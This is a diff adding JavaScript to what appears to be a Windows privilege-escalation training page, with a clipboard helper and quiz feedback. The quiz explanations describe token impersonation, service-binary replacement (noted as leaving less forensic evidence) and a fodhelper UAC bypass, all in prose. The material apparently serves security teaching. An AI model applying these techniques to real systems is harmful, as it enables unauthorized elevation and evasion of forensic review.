+        // Copy function for copy-paste elements
+        function copyToClipboard(element) {
+            const text = element.textContent.trim();
+            navigator.clipboard.writeText(text).then(() => {
+                const original = element.textContent;
+                element.textContent = 'COPIED!';
+                setTimeout(() => element.textContent = original, 2000);
+            });
+        }
+
+        // Quiz functionality
+        function checkAnswer(option, quizId) {
+            const container = document.getElementById(quizId);
+            const options = container.querySelectorAll('.quiz-option');
+            const feedback = document.getElementById('feedback-' + quizId);
+            
+            // Disable all options
+            options.forEach(opt => {
+                opt.style.pointerEvents = 'none';
+                if (opt.dataset.correct === 'true') {
+                    opt.classList.add('correct');
+                } else if (opt === option) {
+                    opt.classList.add('wrong');
+                }
+            });
+            
+            // Show feedback
+            feedback.classList.add('show');
+            if (option.dataset.correct === 'true') {
+                feedback.classList.add('correct');
+                feedback.innerHTML = '<strong>✓ CORRECT</strong><br>' + getExplanation(quizId, true);
+            } else {
+                feedback.classList.add('wrong');
+                feedback.innerHTML = '<strong>✗ WRONG</strong><br>' + getExplanation(quizId, false);
+            }
+        }
+
+        function getExplanation(quizId, isCorrect) {
+            const explanations = {
+                'quiz-1': 'SeImpersonatePrivilege allows a process to impersonate the token of any client that connects to it. If you have this privilege (common in service accounts like IIS, SQL, Print Spooler), you can trigger a connection from a SYSTEM service and steal its token. This is the most reliable Windows privilege escalation technique.',
+                'quiz-2': 'If the service directory is writable by Everyone (RW Everyone), you can directly replace the service binary with your payload. When the service restarts, it runs your payload as SYSTEM. This is more direct than modifying the service configuration, and leaves less forensic evidence in the registry.',
+                'quiz-3': 'fodhelper.exe is a signed Microsoft binary that auto-elevates without a UAC prompt. Windows trusts signed Microsoft binaries. By hijacking the registry delegate that fodhelper uses, we make it run our command instead. Windows sees the signed binary, skips UAC, and our command runs as admin. Microsoft considers this "by design" and won\'t patch it.'
+            };
+            return explanations[quizId] || 'Keep studying!';
+        }
+    </script>
 </body>
 </html>
